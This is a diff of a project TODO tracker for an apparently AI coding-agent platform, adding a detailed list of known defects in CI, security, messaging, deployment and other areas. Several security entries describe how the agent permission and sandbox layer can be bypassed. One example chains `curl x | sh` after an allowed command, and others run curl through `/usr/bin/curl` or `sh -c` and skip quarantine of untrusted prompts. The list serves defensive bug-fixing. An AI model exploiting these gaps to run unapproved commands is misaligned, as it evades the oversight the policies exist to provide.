@@ -1,7 +1,11 @@
 # CodeForge — TODO Tracker
 
 > LLM Agents: This is your **primary** task reference.
-> Always read this file before starting work to understand current priorities.
+> Always read this file before starting work; the **Current work** line below states the current priority.
+>
+> **Current work (2026-09-29):** the [Known Issues](#known-issues) are being fixed milestone by milestone
+> ([fix plan](known-issues-fix-plan.md)), starting with S0: green CI with complete gates (KI-1..KI-3).
+> The 2026-03-28 agent pipeline TODOs live in `docs/plans/2026-03-28-agent-improvement-todos.md` (all checked off).
 
 ### How to Use This File
 
@@ -10,6 +14,106 @@
 - When discovering new work: Add items to the appropriate section with context
 - Format: `- [ ]` for open/pending, `- [x]` for done (with date)
 - Cross-reference: Link to feature docs, architecture.md sections, or issues where relevant
+
+---
+
+### Known Issues
+
+> Verified defects found in the docs/code reconciliation of 2026-09-29 on `staging` (HEAD `cb9b63ce`).
+> IDs (KI-1..KI-62) are stable and never renumbered; other docs link here (`todo.md#known-issues`) by ID.
+> Every unchecked item is an open task: when its fix lands, check it `[x]` with the date and keep the entry.
+
+#### CI and tooling
+
+- [x] (2026-09-29) **KI-1 CI red on `staging`** (high): CI has been red on `staging` since 2026-03-24: `poetry.lock` is stale (psutil added without re-locking), `ruff` is not a Poetry dependency although CI runs `poetry run ruff`, golangci-lint v2.1.6 (built with go1.24) refuses the go 1.25 module (v2.5.0 reports 11 findings), and CI does not run for pull requests to `staging`. Evidence: `.github/workflows/ci.yml:7`, `.github/workflows/ci.yml:62`, `.github/workflows/ci.yml:85`, `pyproject.toml:33`. **Fixed (S0):** `poetry.lock` regenerated; `ruff` 0.15.1 pinned as Poetry dev dependency (in sync with the ruff-pre-commit rev); golangci-lint v2.5.0 in CI plus fixes for its 11 findings; CI also runs for pull requests to `staging`.
+- [ ] **KI-2 Test suites rotted while CI was red** (high): Python has 2 collection errors (`tests/evaluation.py` is shadowed by the `tests/evaluation/` package; `test_score_key_normalization.py` imports names moved to `_benchmark_gemmas.py`) and 127 failing tests in 43 files; in Go, TestCORSWildcardRestriction, TestHandleListPolicies (nil-pointer panic), TestAPIKeyStore_TenantIsolation and TestOAuthState_GetExpired fail, `internal/service` hangs until the 10 min timeout, and the contract test rewrites `testdata/contracts/*.json` without a trailing newline. The frontend has 13 `tsc --noEmit` errors (some are runtime bugs, see KI-40) and 4 failing vitest tests; neither the type check, vitest nor any `-tags=integration` test runs in CI. Evidence: `workers/tests/test_score_key_normalization.py:16`, `scripts/test.sh:73`, `.github/workflows/ci.yml:114-120`.
+- [x] (2026-09-29) **KI-3 Dependencies with known vulnerabilities** (high): The Security Scanning job is red: govulncheck finds 8 reachable vulnerabilities in 5 Go modules (chi v5.2.5 RealIP spoofing, pgx v5.9.1 placeholder SQL injection, otel sdk v1.42.0, grpc v1.79.2, x/net v0.51.0, x/text v0.35.0), `npm audit --omit=dev` reports 4 critical and 1 high (seroval, maplibre-gl via @unovis 1.6.4, lodash-es, protocol-buffers-schema, yaml) and pip-audit 30+ advisories (cryptography, pyjwt, starlette, mcp, python-multipart, requests, urllib3, aiohttp, pytest, ...). `setuptools<82` is still pinned for agentneo, which was removed on 2026-03-05. Evidence: `go.mod:9`, `go.mod:11`, `frontend/package.json:24-25`, `pyproject.toml:34`. **Fixed (S0):** Go chi v5.3.0, pgx v5.9.2, OpenTelemetry v1.44.0, grpc v1.83.1, x/net v0.55.0, x/text v0.39.0; `@unovis` ^1.7.1 plus in-range npm updates; Python updates (cryptography, pyjwt, starlette, mcp, python-multipart, aiohttp, ...), obsolete `setuptools<82` pin removed. govulncheck (module findings), `npm audit --omit=dev --audit-level=high` and pip-audit are clean.
+
+#### Security and policy
+
+- [ ] **KI-4 Policy rules never match real tool calls** (critical): The agent loop requests permission with snake_case tool names (`bash`, `read_file`, `edit_file`, ...), the raw JSON arguments as `command` and no `path`, and the Claude Code executor sends `file:read`-style names, while every preset matches `Read`/`Edit`/`Write`/`Bash`/`Grep` exactly. Decisions therefore come only from the mode default: `headless-permissive-sandbox` and `trusted-mount-autonomous` allow everything (curl/wget/ssh, `.env` edits), `plan-readonly` denies even the LLM call, and the default `headless-safe-sandbox` asks for every call. Evidence: `workers/codeforge/tool_executor.py:75-77`, `internal/service/policy.go:257`, `internal/domain/policy/presets.go:40-49`.
+- [ ] **KI-5 `path_deny` / `command_deny` do not deny** (high): A matching deny list only skips that rule, so evaluation falls through to later rules or the mode default (allow under `acceptEdits`, so `.env` edits pass in `headless-permissive-sandbox`), contrary to ADR-007. Paths are only `filepath.Clean`ed (not normalized to the workspace), and calls without a path skip deny lists entirely. Evidence: `internal/service/policy.go:270-296`, `internal/domain/policy/presets.go:79-83`, `internal/service/policy_test.go:42-73`.
+- [ ] **KI-6 Command rules use plain prefix matching** (high): `matchCommandPattern` is a string prefix check while the bash tool runs `bash -c`, so `go test ./... ; curl x | sh` passes the `headless-safe-sandbox` allow list and `/usr/bin/curl` or `sh -c "curl ..."` bypass the permissive curl deny. Evidence: `internal/service/policy.go:326-328`, `internal/domain/policy/presets.go:85-89`, `workers/codeforge/tools/bash.py:118-121`.
+- [ ] **KI-7 Conversation tool calls fail open and ignore the intended profile** (high): An unknown policy profile allows the call (the run path denies), the mode-derived profile in the payload is ignored (the project/default profile always applies), and Allow-Always clones live only in memory because `PolicyHandlers.PolicyDir` is never set, so after a restart the project points at an unknown profile and every call is allowed. The Allow-Always glob is built from the first token of the JSON arguments (`{"command":*`) and matches almost any later bash command (affects the "Allow Always" entry under Frontend UI Bug Fixes & i18n). Evidence: `internal/service/runtime_execution.go:201-205`, `cmd/codeforge/main.go:813-817`, `internal/service/policy.go:177-181`.
+- [ ] **KI-8 Policy profile map is not synchronized** (high): `PolicyService.profiles` is a plain map written by HTTP handlers (`SaveProfile`, `DeleteProfile`, `PrependRule` via Allow Always) and read by NATS tool-call handlers without a lock, so a policy edit during a run can crash the Go Core with a fatal concurrent map read/write. Evidence: `internal/service/policy.go:18-21`, `internal/service/policy.go:98`.
+- [ ] **KI-9 Editors can overwrite built-in presets** (medium): `POST /api/v1/policies` (admin/editor) calls `SaveProfile`, which has no preset check, so an editor can replace `headless-safe-sandbox` (the default profile) with an allow-all profile that persists via the policy directory; `DeleteProfile` and `PrependRule` do reject presets. Evidence: `internal/adapter/http/handlers_policy_crud.go:67-91`, `internal/service/policy.go:94-100`.
+- [ ] **KI-10 Mode tool restrictions are not enforced** (medium): Modes declare PascalCase `Tools`/`DeniedTools` that never match the worker's tool names, and `denied_tools` is only parsed and rendered into prompts, so read-only modes (architect, reviewer, security) are still offered `write_file`, `edit_file` and `bash`. Evidence: `workers/codeforge/models.py:79`, `internal/service/mode_prompt.go:83-84`, `workers/codeforge/agent_loop.py:226-252`.
+- [x] (2026-09-29) **KI-11 Rate limiting and audit IPs use spoofable headers** (high): `chimw.RealIP` runs before the rate limiters, so `True-Client-IP` / `X-Real-IP` / `X-Forwarded-For` choose the bucket (bypassing the login brute-force limiter) and the audit-log IP, and rotating values fills the 100k bucket cap so new clients get 429. Evidence: `cmd/codeforge/main.go:924`, `internal/middleware/ratelimit.go:165-170`, `internal/middleware/audit.go:28`. **Fixed (S0):** `chimw.RealIP` (deprecated in chi v5.3.0) replaced by `middleware.ClientIP` (`internal/middleware/clientip.go`), which honours forwarding headers only from `server.trusted_proxies` / `CODEFORGE_TRUSTED_PROXIES` and runs first in the chain; rate limit keys group IPv6 by /64. Fixed early in S0 because the chi upgrade made `RealIP` a lint error.
+- [ ] **KI-12 WebSocket fan-out and ticket auth are broken** (high): Every event is broadcast to every tenant's clients (`BroadcastToTenant` has no callers), and broadcasts write to all clients under the hub lock without a write timeout, so one stalled client blocks all live updates. `POST /api/v1/ws/ticket` panics because `WSTickets` is never wired, so the JWT still travels in the WebSocket URL (audit SEC-008 / WT-12 not in effect). Evidence: `internal/adapter/ws/events.go:10-21`, `internal/adapter/ws/handler.go:91-111`, `internal/adapter/http/handlers_auth.go:485`.
+- [ ] **KI-13 Sandbox and hybrid modes provide no isolation** (high): A container is created per run, but `SandboxService.Exec` has no callers and the worker runs tools as local subprocesses (`bash -c` with the worker's filesystem, network and credentials). `--cpus` uses integer division, so a `cpu_quota` below 1000 becomes `--cpus=0` (unlimited). Evidence: `internal/service/sandbox.go:217`, `internal/service/sandbox.go:91`, `workers/codeforge/tools/bash.py:118-124`.
+- [ ] **KI-14 Dev compose exposes PostgreSQL and NATS** (medium): `docker-compose.yml` publishes PostgreSQL (default password `codeforge_dev`) and NATS 4222/8222 without authentication on all interfaces, so anyone on the host's network can read the database or publish forged NATS messages (audit SEC-003, SEC-004, INFRA-007, INFRA-008 still open). Evidence: `docker-compose.yml:77-82`, `docker-compose.yml:116-119`.
+- [ ] **KI-15 A2A and handoff trust gates are bypassed** (medium): The A2A endpoints and AgentCard sit behind the global JWT middleware, so A2A API keys are rejected, and inbound A2A prompts are stored as untrusted but published without quarantine. `HandoffService` is never constructed, so Python handoffs skip quarantine, inbox delivery and `handoff.status` events (War Room handoff arrows never render). Evidence: `cmd/codeforge/main.go:921`, `internal/middleware/auth.go:27-38`, `internal/adapter/a2a/executor.go:64-84`, `internal/service/handoff.go:36`.
+- [ ] **KI-16 Experience pool has no tenant isolation and cannot be disabled** (medium): The worker always creates one `ExperiencePool` with the zero-UUID tenant and ignores `experience.enabled` / `CODEFORGE_EXPERIENCE_ENABLED` (documented default: off), `confidence_threshold` and `max_entries`, so all experiences land in the zero tenant and similar prompts can be answered from cache without running the agent loop. Evidence: `workers/codeforge/consumer/__init__.py:137`, `workers/codeforge/memory/experience.py:39`, `internal/config/config.go:229-233`.
+
+#### Messaging and runtime
+
+- [ ] **KI-18 NATS delivery is unsafe** (high): Go durable consumers have a 5 min inactivity threshold and deliver from the stream start, so after more than 5 min of Go Core downtime they are recreated and replay up to 30 days of messages (duplicate conversation messages, re-finalized runs). Python work handlers ack only at the end with a 30 s ack wait and unlimited redelivery, so with several workers any run longer than 30 s executes twice, and per-run cancel listeners are never unsubscribed and can exhaust the 200-consumer limit. Evidence: `internal/adapter/nats/nats.go:240-251`, `workers/codeforge/consumer/__init__.py:209-234`, `workers/codeforge/runtime.py:72-96`.
+- [ ] **KI-19 Python retry/DLQ path is unreachable** (medium): Retries are counted from a `Retry-Count` header nobody sets, so failed `tasks.agent.*` messages are NAK'd forever and never dead-lettered; invalid payloads are NAK'd without delay in a hot loop, and failures after the dedup mark are acked as duplicates on redelivery. Go dead-letters handler errors, but messages that exhaust `MaxDeliver` through ack timeouts are dropped without a DLQ copy. Evidence: `workers/codeforge/consumer/_base.py:62-70`, `workers/codeforge/consumer/_tasks.py:67-76`, `workers/codeforge/consumer/_base.py:145-160`.
+- [ ] **KI-20 Schema validation skips run and context subjects** (low): `Validate()` accepts any JSON on `runs.*` and does not check `context.*` / `repomap.*`, although payload structs exist for them. Evidence: `internal/port/messagequeue/validator.go:14-17`, `internal/port/messagequeue/validator.go:122-133`.
+- [ ] **KI-21 `runs.start` is a single LLM completion; late approvals are lost** (medium): The run path makes one policy request and one LiteLLM completion (no tool loop, no agent backend, no file changes), so quality gates and delivery run against an unchanged workspace. When a tool call resolves to ask, the worker gives up after 30 s while Go waits 60 s for HITL approval, so approvals given after 30 s are lost. Evidence: `workers/codeforge/executor.py:191-259`, `workers/codeforge/constants.py:24`, `internal/service/runtime_approval.go:25-29`.
+- [ ] **KI-22 Subjects without a working counterpart** (medium): `tasks.cancel` is published by every backend `Stop()`, but no worker path cancels the running Aider/OpenHands/Goose/OpenCode/Plandex process, and `review.trigger.request` has a Python consumer that Go never publishes to. Evidence: `internal/adapter/aider/backend.go:62-72`, `workers/codeforge/consumer/__init__.py:188`, `internal/port/messagequeue/queue.go:124`.
+- [ ] **KI-23 Run and backend-task payloads lack workspace and backend** (medium): `RunStartPayload` and the `tasks.agent.*` payload carry no `workspace_path` or backend, so backend tasks always get `workspace_path ""`, and the production compose has no workspace volume shared by core and worker. Evidence: `internal/port/messagequeue/schemas_run.go:44-62`, `workers/codeforge/consumer/_tasks.py:50`, `docker-compose.prod.yml:157-243`.
+- [ ] **KI-24 A stopped conversation stays cancelled forever** (high): `StopConversation` stores the conversation ID in `RunStateManager.cancelledConvs` and nothing clears it; conversation runs reuse the conversation ID, so every later tool call in that conversation is denied until the Go Core restarts (a side effect of the 2026-03-19 Bug 2 fix below). Evidence: `internal/service/run_state.go:125-131`, `internal/service/runtime_execution.go:168-170`.
+- [ ] **KI-30 Termination, stall and cancel paths leave plans hanging** (medium): The termination-limit, stall-detection and user-cancel paths complete the run without calling `onRunComplete`, so execution-plan steps stay running; the termination path also skips the task/agent reset and run-state cleanup. Evidence: `internal/service/runtime_execution.go:50-58`, `internal/service/runtime_execution.go:328-345`, `internal/service/runtime.go:475`.
+
+#### Quality gates and delivery
+
+- [ ] **KI-26 Delivery requires a passed quality gate** (high): `triggerDelivery` is only called after a passed gate, so presets without gates (`trusted-mount-autonomous`, `supervised-ask-all`, `plan-readonly`) never deliver despite `deliver_mode`, and a failed gate without rollback still ends the run `completed`. `HandleRunComplete` has no terminal-state guard, so late or replayed completions overwrite cancelled or timed-out runs. Evidence: `internal/service/runtime_completion.go:172`, `internal/service/runtime_completion.go:184`, `internal/service/runtime_completion.go:15-20`.
+- [ ] **KI-27 Shadow checkpoints corrupt delivery** (high): Checkpoints are real commits in the workspace that are removed after delivery by `git reset --soft <first checkpoint>^`, so commit-local delivery is erased (changes left staged), branch/PR delivery pushes the checkpoint commits, and patch delivery (`git diff HEAD`) contains only the last edit. Evidence: `internal/service/runtime_execution.go:136-144`, `internal/service/checkpoint.go:139-157`, `internal/service/deliver.go:79`.
+- [ ] **KI-28 Quality gate timeout is ignored** (medium): `runtime.quality_gate_timeout` / `CODEFORGE_QG_TIMEOUT` is never sent to the worker, which uses a fixed 120 s per command and does not kill a timed-out process; runs in `quality_gate` status have no watchdog, so a lost gate result leaves the run there forever. Evidence: `internal/config/loader.go:201`, `workers/codeforge/qualitygate.py:127-129`, `internal/service/runtime_lifecycle.go:33-35`.
+- [ ] **KI-29 Quality gates run Go commands only and fail open** (medium): Gates always use the Go defaults (`go test ./...`, `golangci-lint run ./...`) whatever the project language, and a missing test or lint result counts as passed. Evidence: `internal/service/runtime_completion.go:80-82`, `internal/service/runtime_completion.go:155-157`.
+
+#### Persistence
+
+- [ ] **KI-31 No optimistic locking on runs, plans and teams** (medium): Run, plan and team updates have no version check or status predicate, and `HandleToolCallRequest` writes `running` after the up-to-60 s HITL wait, so a run cancelled or timed out meanwhile is moved back to `running`. Evidence: `internal/adapter/postgres/store_run.go:38-53`, `internal/service/runtime_execution.go:148`.
+- [ ] **KI-32 Result and plan events are not persisted** (medium): Task result events are appended with agent_id `""` (error only logged) and `plan.*` events with empty agent_id/task_id (error discarded), which the UUID NOT NULL columns reject. Evidence: `internal/service/agent.go:176-181`, `internal/service/orchestrator_consensus.go:402-408`, `internal/adapter/postgres/migrations/004_create_agent_events.sql:4-7`.
+- [ ] **KI-33 Teams are never cleaned up** (low): `CleanupTeam` is only called from tests, so teams stay `initializing` forever and their agents are not released. Evidence: `internal/service/pool_manager.go:172-196`.
+
+#### Worker and observability
+
+- [ ] **KI-34 Worker health check breaks the production worker** (high): There is no HTTP health endpoint (`health.py` is never imported, `CODEFORGE_WORKER_HEALTH_PORT` is unused), and the replacement sentinel file in `/tmp` cannot be written under the prod compose's `read_only: true` without tmpfs, so the worker crashes at startup and restart-loops while the compose healthcheck only tests importability. Evidence: `workers/codeforge/health.py:9`, `workers/codeforge/consumer/__init__.py:90`, `workers/codeforge/consumer/__init__.py:204`, `docker-compose.prod.yml:210`.
+- [ ] **KI-35 Python log schema differs from Go** (low): Worker logs use structlog's `event`/`timestamp`/lowercase `level` instead of the Go slog schema (`msg`/`time`/`level`), and stdlib loggers (httpx, nats) print plain text to the same stream. Evidence: `workers/codeforge/logger.py:42-57`, `workers/codeforge/logger.py:29`.
+- [ ] **KI-36 OTEL export is incomplete** (medium): The Go exporter never calls `WithInsecure()`, so the default TLS credentials win and `CODEFORGE_OTEL_INSECURE=true` cannot reach a plaintext collector such as the dev Jaeger; Python metrics have no MeterProvider, and the worker never injects trace context into published messages. Evidence: `internal/adapter/otel/setup.go:53-63`, `workers/codeforge/tracing/metrics.py:7-43`, `workers/codeforge/tracing/propagation.py:26`.
+- [ ] **KI-37 Verifier metrics always score 0.0** (medium): `trajectory_verifier` and `logprob_verifier` import `litellm`, which is not a worker dependency, and catch the failure, so benchmark runs using them (and the hybrid pipeline's rank stage) always get 0.0. Evidence: `workers/codeforge/evaluation/evaluators/trajectory_verifier.py:155`, `workers/codeforge/evaluation/evaluators/logprob_verifier.py:89`.
+- [ ] **KI-38 Tool configuration drift** (low): The capability allowlist names `handoff` but the tool is registered as `handoff_to`, so `api_with_tools` models lose the handoff tool, and the Go settings `agent.builtin_tools` and `agent.tool_output_max_chars` are never read. Evidence: `workers/codeforge/tools/capability.py:86`, `workers/codeforge/tools/handoff.py:24`, `internal/config/config.go:169`, `internal/config/config.go:174`.
+
+#### Frontend
+
+- [ ] **KI-39 Live updates are not wired** (medium): Run, plan and agent panels are never refreshed by WebSocket events (only toasts), the project page filters `task.output` on a `project_id` the event never carries so live output stays empty, and `AgentLane` appends every task's output to every lane. Evidence: `frontend/src/features/project/useProjectDetail.ts:120-128`, `frontend/src/features/project/useProjectDetail.ts:144-145`, `frontend/src/features/project/AgentLane.tsx:47-52`.
+- [ ] **KI-40 API client mismatches** (medium): The UI deletes models with `DELETE /api/v1/llm/models/{id}`, but only `POST /api/v1/llm/models/delete` exists, and type errors hide calls to non-existent methods (`api.mcp.listProjectServers`, `assignToProject`, `unassignFromProject`) that throw when MCP server assignment is used. Evidence: `frontend/src/api/resources/llm.ts:25-26`, `internal/adapter/http/routes.go:421`, `frontend/src/features/project/CompactSettingsPopover.tsx:42`.
+- [ ] **KI-41 Settings popover wipes the project config** (medium): The compact settings popover saves `{config: {autonomy_level}}` and `ProjectService.Update` replaces the whole config map, dropping `policy_preset`, `detected_languages` and `expansion_prompt`; `autonomy_level` itself is read by no backend code. Evidence: `frontend/src/features/project/CompactSettingsPopover.tsx:107-113`, `internal/service/project.go:183-184`.
+- [ ] **KI-42 Channel real-time events are never broadcast** (low): `channel.message` / `channel.typing` / `channel.read` are defined but never sent and the channel UI has no WebSocket subscription, so messages from other users, agents or webhooks appear only after a reload. Evidence: `internal/domain/event/broadcast.go:101-103`, `frontend/src/features/channels/ChannelView.tsx:47-75`.
+
+#### Deployment and configuration
+
+- [ ] **KI-43 `postgres:18-alpine` rejects the data volume path** (high): Dev and prod compose mount the data volume at `/var/lib/postgresql/data`, which the PostgreSQL 18 image refuses (it expects `/var/lib/postgresql`), so PostgreSQL exits before initdb and nothing that depends on it starts. Evidence: `docker-compose.yml:84`, `docker-compose.prod.yml:36`.
+- [ ] **KI-44 Production PostgreSQL enables SSL without certificates** (high): The prod compose sets `ssl=on` with `server.crt` / `server.key` that no script or mount creates, so PostgreSQL refuses to start (audit INFRA-002 still open). Evidence: `docker-compose.prod.yml:56-60`.
+- [ ] **KI-45 Read-only production core has no writable workspace** (high): The core runs with `read_only: true`, no volume or tmpfs and the relative default `data/workspaces`, so cloning a repository and writing the initial admin password file fail, and no workspace survives container recreation. Evidence: `docker-compose.prod.yml:163`, `internal/config/config.go:487`, `internal/config/config.go:590`.
+- [ ] **KI-46 Production secrets handling is broken** (high): Mounted Docker secret files are never read by the Go Core (`secrets.FileProvider` / `Auto()` are test-only) while the prod compose requires every secret as `${VAR:?}` env (visible in `docker inspect`); neither the JWT secret nor `CODEFORGE_INTERNAL_KEY` is passed to core (users are logged out on every restart, worker-to-core calls get 401). `scripts/validate-env.sh` checks `CODEFORGE_JWT_SECRET`, which nothing reads (the real variable is `CODEFORGE_AUTH_JWT_SECRET`). Evidence: `internal/secrets/provider.go:61`, `cmd/codeforge/main.go:294`, `docker-compose.prod.yml:157-178`, `scripts/validate-env.sh:4`. Also: `scripts/generate-secrets.sh` writes base64 values (`/`, `+`, `=`) that `docker-compose.prod.yml` embeds unescaped in the `DATABASE_URL` / `NATS_URL` userinfo, and the prod worker gets no `CODEFORGE_INTERNAL_KEY`.
+- [ ] **KI-47 Blue-green Traefik routes the frontend to the wrong port** (high): Traefik sends `frontend-blue` / `frontend-green` traffic to port 80 while nginx listens on 8080, so blue-green deployments cannot serve the frontend (audit INFRA-001 still open). Evidence: `docker-compose.blue-green.yml:59`, `docker-compose.blue-green.yml:72`, `frontend/nginx.conf:5`.
+- [ ] **KI-48 Image scan pulls a tag that is never pushed** (medium): `docker-build.yml` tags images with the short SHA without prefix, but the scan job pulls `sha-<full sha>`, so the Grype scan fails on every push and image scanning never runs. Evidence: `.github/workflows/docker-build.yml:44`, `.github/workflows/docker-build.yml:207`.
+- [ ] **KI-49 Restore script never terminates active connections** (medium): `psql -c` does not substitute `:'dbname'` and the error is discarded, so `dropdb` fails while core, worker or LiteLLM are connected and the restore aborts. Evidence: `scripts/restore-postgres.sh:42-44`.
+- [ ] **KI-50 Devcontainer sets `LITELLM_URL`** (medium): The devcontainer sets `LITELLM_URL`, but Go Core and worker read `LITELLM_BASE_URL` and fall back to `localhost:4000`, which is unreachable from the devcontainer; the 2026-03-19 Bug 3 fix below covered the worker code, not the devcontainer. Evidence: `.devcontainer/devcontainer.json:20`, `internal/config/loader.go:180`, `workers/codeforge/config.py:187`.
+- [ ] **KI-51 Configuration drift** (low): `OLLAMA_BASE_URL` does not change LiteLLM's Ollama routing (`litellm/config.yaml` hardcodes `api_base`), `DOCS_MCP_*` in `.env.example` are ignored by `docker-compose.yml`, `scripts/logs.sh` suggests a non-existent `docs-mcp-server` service, and `codeforge.example.yaml` contradicts the code (bcrypt minimum is 12, not 4; routing is enabled by default). The SMTP port defaults to 0 although documented as 587. Evidence: `litellm/config.yaml:18`, `docker-compose.yml:146-149`, `scripts/logs.sh:27`, `codeforge.example.yaml:105`, `internal/config/config.go:211`. Also: `scripts/resolve-docker-ips.sh` runs `set -euo pipefail` although it is meant to be sourced into an interactive shell; the worker `HistoryConfig.max_context_tokens` default (120000) differs from Go `agent.max_context_tokens` (128000).
+- [ ] **KI-59 Config files are not ASCII-only** (low): CLAUDE.md requires ASCII in config files, but `configs/benchmarks/{agent-coding,basic-coding,tool-use-basic}.yaml`, `configs/model_pricing.yaml`, `internal/service/prompts/system/tool_permissions.yaml` and `scripts/{logs,resolve-docker-ips,test}.sh` contain non-ASCII characters (`codeforge.example.yaml` fixed 2026-09-29). Evidence: `LC_ALL=C grep -P '[^\x00-\x7F]'` on those files.
+
+#### Compliance
+
+- [ ] **KI-52 GDPR retention never runs** (medium): `RetentionService` is never instantiated, so expired sessions, conversations, runs and audit entries are never purged, and `AnonymizeExpiredIPAddresses` uses `UPDATE ... LIMIT`, which PostgreSQL rejects (residual of WT-3 below). Evidence: `internal/service/retention.go:25`, `internal/adapter/postgres/store_audit_log.go:94-99`.
+- [ ] **KI-53 Audit log listing breaks after GDPR erasure** (high): Migration 089 makes `admin_email` nullable and GDPR erasure sets it to NULL, but both listing queries scan it into a `string`, so the tenant's audit log endpoint returns 500 once any user with audit entries has been erased (residual of WT-3 below). Evidence: `internal/adapter/postgres/store_audit_log.go:42`, `internal/adapter/postgres/store_audit_log.go:64`, `internal/adapter/postgres/store_audit_log.go:112`.
+- [ ] **KI-54 deepeval telemetry is not disabled** (low): deepeval is a runtime dependency and `DEEPEVAL_TELEMETRY_OPT_OUT` is set nowhere, so evaluation runs may send usage telemetry to a third party that the privacy policy does not disclose (audit COMP-014 still open). Evidence: `pyproject.toml:28`, `workers/codeforge/evaluation/metrics.py:11-12`.
+
+#### Unwired features
+
+- [ ] **KI-17 Contract-first review/refactor (Phase 31) is not wired** (high): `ReviewTriggerService` gets a nil orchestrator, so `POST /projects/{id}/review-refactor` and `/boundaries/analyze` return `{"triggered": true}` but start nothing, and `DiffImpactScorer` has no caller. `RefactorApproval` listens for `refactor.approval_required` while the backend sends `review.approval_required` with another payload, and its approve/reject `fetch()` calls send no Authorization header (also the WT-7 remainder below). Evidence: `cmd/codeforge/main.go:489`, `internal/service/review_trigger.go:25-27`, `frontend/src/features/project/RefactorApproval.tsx:34`, `frontend/src/features/project/RefactorApproval.tsx:45`.
+- [ ] **KI-25 `spawn_subagent` starts nothing** (medium): The tool only publishes an `agent.subagent_requested` trajectory event and tells the LLM "Sub-agent spawned"; Go only logs and broadcasts it, so the orchestrating model waits for results that never arrive. Evidence: `workers/codeforge/tools/spawn_subagent.py:110-129`, `internal/service/runtime_subscribers.go:259-282`.
+- [ ] **KI-55 GitHub OAuth web flow is never wired** (medium): `NewGitHubOAuthService` has no caller and `Handlers.GitHubOAuth` is never set, so `/api/v1/auth/github` always returns 501. Evidence: `internal/service/github_oauth.go:38`, `internal/adapter/http/handlers_github_oauth.go:10-13`.
+- [ ] **KI-56 Webhook-triggered roadmap sync always fails** (medium): GitHub webhooks ask for provider `github` (registered as `github-issues`), Plane gets no `api_token` and GitLab an empty base URL; the webhook still returns 200 and the failure is only logged. Evidence: `internal/service/pm_webhook.go:31-47`, `internal/service/pm_webhook.go:88`, `internal/adapter/githubpm/provider.go:15`.
+- [ ] **KI-57 Email HITL provider sends no approval emails** (medium): The email feedback provider is built with nil recipients and a hardcoded localhost callback, and its Approve/Deny GET links point at a POST-only authenticated route, so approval requests by email are silently never delivered. Evidence: `cmd/codeforge/main.go:761-763`, `internal/adapter/email/feedback.go:34-60`.
+- [ ] **KI-58 Agent `create_skill` always fails** (medium): The tool inserts `tenant_id ''` into the UUID NOT NULL `skills.tenant_id` column, which PostgreSQL rejects, so agent-generated skill drafts (Auto-Agent Skills Task 10 below) never persist. Evidence: `workers/codeforge/consumer/_conversation_skill_integration.py:46`, `internal/adapter/postgres/migrations/045_create_skills.sql:4`.
+- [ ] **KI-60 Tiered cache is built and discarded** (low): `main.go` builds the L1/L2 cache and throws it away (`_ = tiered.New(...)`), so no service uses it although docs describe it as active. Evidence: `cmd/codeforge/main.go:185`.
+- [ ] **KI-61 SIGHUP config reload has no effect** (medium): the `ConfigHolder` is created after every service has copied its config and nothing reads it; SIGHUP only really reloads the secrets vault, config changes still need a restart. Evidence: `cmd/codeforge/main.go:1056-1065`.
+- [ ] **KI-62 Stall re-planning is not wired** (medium): `OrchestratorService.ReplanStep` has no production caller, so the documented MagenticOne stall detection plus re-planning loop never re-plans. Evidence: `internal/service/orchestrator_consensus.go:413`.
 
 ---
 
@@ -28,12 +132,12 @@
 - [x] Git local provider (clone, status, pull, branches), agent lifecycle with Aider backend, WebSocket live output, LLM provider management
 
 #### Phase 3 -- Reliability & Performance (COMPLETED)
-- [x] Hierarchical config, structured JSON logging, circuit breaker, graceful shutdown, idempotency keys, dead letter queue
-- [x] Event sourcing, tiered cache (ristretto L1 + NATS KV L2), rate limiting, DB pool tuning, worker pools
+- [x] Hierarchical config, structured JSON logging, circuit breaker, graceful shutdown, idempotency keys, dead letter queue (Python DLQ path unreachable, see [KI-19](#known-issues))
+- [x] Event sourcing, tiered cache adapter (ristretto L1 + NATS KV L2, constructed at startup but not yet used by any service), rate limiting (see [KI-11](#known-issues)), DB pool tuning, worker pools
 
 #### Phase 4 -- Agent Execution Engine (COMPLETED)
-- [x] Policy layer (first-match-wins, 4 presets, YAML custom policies), runtime step-by-step protocol
-- [x] Docker sandbox execution, stall detection, quality gates, 5 delivery modes, shadow Git checkpoints
+- [x] Policy layer (first-match-wins, 4 presets, YAML custom policies), runtime step-by-step protocol (open defects: [KI-4..KI-9](#known-issues))
+- [x] Docker sandbox execution, stall detection, quality gates, 5 delivery modes, shadow Git checkpoints (open defects: [KI-13, KI-26..KI-29](#known-issues))
 - [x] Resource limits, secrets vault with SIGHUP reload, multi-tenancy preparation
 
 #### Phase 5 -- Multi-Agent Orchestration (COMPLETED)
@@ -51,13 +155,13 @@
 
 #### Phase 8 -- Roadmap Foundation, Trajectory, Docker Production (COMPLETED)
 - [x] Roadmap/Feature-Map domain model, spec/PM provider ports, 12 REST endpoints
-- [x] Trajectory API with cursor pagination, Docker production images, docker-compose.prod.yml
+- [x] Trajectory API with cursor pagination, Docker production images, docker-compose.prod.yml (open defects: [KI-43..KI-46](#known-issues))
 
 #### Phase 9A-9E -- Advanced Integrations (COMPLETED)
 - [x] 9A: OpenSpec, Markdown, GitHub Issues adapters, spec/PM import
 - [x] 9B: SVN provider, Gitea/Forgejo PM adapter, VCS webhooks (GitHub + GitLab), bidirectional PM sync
-- [x] 9C: PM webhook processing, Slack + Discord notification adapters
-- [x] 9D: OpenTelemetry stub, A2A protocol stub, AG-UI event protocol, blue-green deployment
+- [x] 9C: PM webhook processing (webhook-triggered sync fails, see [KI-56](#known-issues)), Slack + Discord notification adapters
+- [x] 9D: OpenTelemetry stub, A2A protocol stub, AG-UI event protocol, blue-green deployment (see [KI-47](#known-issues))
 - [x] 9E: Plane.so PM adapter (full CRUD), full auto-detection engine, Feature-Map visual editor
 
 #### Phase 10 -- Frontend Foundations (COMPLETED)
@@ -71,10 +175,10 @@
 
 #### Post-Phase 11 -- Security Hardening (COMPLETED)
 - [x] 18 audit findings fixed (5 P0, 8 P1, 5 P2): prompt injection defense, secret redaction, audit trail
-- [x] Fail-closed quality gates, JWT standard claims + revocation, API key scopes, account lockout
+- [x] Fail-closed quality gates (a missing check result still counts as passed, see [KI-29](#known-issues)), JWT standard claims + revocation, API key scopes, account lockout
 
 #### Phase 12A-12K -- Architecture Evolution (COMPLETED)
-- [x] 12A: Mode extensions (DeniedTools, DeniedActions, RequiredArtifact, modular prompt templates)
+- [x] 12A: Mode extensions (DeniedTools, DeniedActions, RequiredArtifact, modular prompt templates; tool restrictions are prompt-only, see [KI-10](#known-issues))
